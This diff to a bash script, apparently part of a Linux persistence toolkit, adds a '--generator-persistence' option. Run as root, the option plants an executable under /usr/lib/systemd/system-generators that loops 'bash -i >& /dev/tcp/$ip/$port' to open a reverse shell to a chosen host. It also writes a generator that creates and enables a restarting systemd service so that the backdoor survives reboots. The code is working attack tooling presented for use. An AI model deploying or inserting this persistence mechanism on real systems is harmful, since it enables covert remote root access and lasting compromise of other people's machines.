@@ -108,6 +108,10 @@ usage_root() {
     echo "          --path <path>                Specify custom service path (must end with .service)"
     echo "          --command <command>          Specify custom persistence command (no validation)"
     echo "          --timer                      Create systemd timer (1 minute interval)"
+    echo "  --generator-persistence      Set up generator persistence"
+    echo "      --default                    Use default generator persistence settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
     echo "  --at                         At job persistence"
     echo "      --default                    Use default at settings"
     echo "          --ip <ip>                  Specify IP address"
@@ -417,6 +421,87 @@ setup_systemd() {
 	fi
 
 	echo "[+] Persistence established."
+}
+
+setup_generator_persistence() {
+    local default=0
+    local ip=""
+    local port=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --ip )
+                shift
+                ip=$1
+                ;;
+            --port )
+                shift
+                port=$1
+                ;;
+            * )
+                echo "Invalid option for --generator-persistence: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 0 ]]; then
+        echo "Error: --default must be specified."
+        exit 1
+    fi
+
+    if [[ -z $ip || -z $port ]]; then
+        echo "Error: --ip and --port must be specified."
+        exit 1
+    fi
+
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        exit 1
+    fi
+
+    # Create the /usr/lib/systemd/system-generators/makecon file
+    cat <<-EOF > /usr/lib/systemd/system-generators/makecon
+	#!/bin/bash
+	nohup bash -c "while :; do bash -i >& /dev/tcp/$ip/$port 0>&1; sleep 10; done" &
+	EOF
+
+    chmod +x /usr/lib/systemd/system-generators/makecon
+
+    # Create the /usr/lib/systemd/system-generators/generator file
+    cat <<-EOF > /usr/lib/systemd/system-generators/generator
+	#!/bin/sh
+	# Create a systemd service unit file in the late directory
+	cat <<-EOL > "/run/systemd/system/generator.service"
+	[Unit]
+	Description=Generator Service
+
+	[Service]
+	ExecStart=/usr/lib/systemd/system-generators/makecon
+	Restart=always
+	RestartSec=10
+
+	[Install]
+	WantedBy=multi-user.target
+	EOL
+
+	mkdir -p /run/systemd/system/multi-user.target.wants/
+	ln -s /run/systemd/system/generator.service /run/systemd/system/multi-user.target.wants/generator.service
+
+	# Ensure the script exits successfully
+	exit 0
+	EOF
+
+    chmod +x /usr/lib/systemd/system-generators/generator
+
+    # Reload systemd and enable the generator service
+    systemctl daemon-reload
+    systemctl enable generator
+
+    echo "[+] System-generator has been successfully planted for persistence."
 }
 
 setup_cron() {
@@ -1911,6 +1996,11 @@ main() {
 				setup_systemd "$@"
 				exit
 				;;
+            --generator-persistence )
+                shift
+                setup_generator_persistence "$@"
+                exit
+                ;;
 			--cron )
 				shift
 				setup_cron "$@"
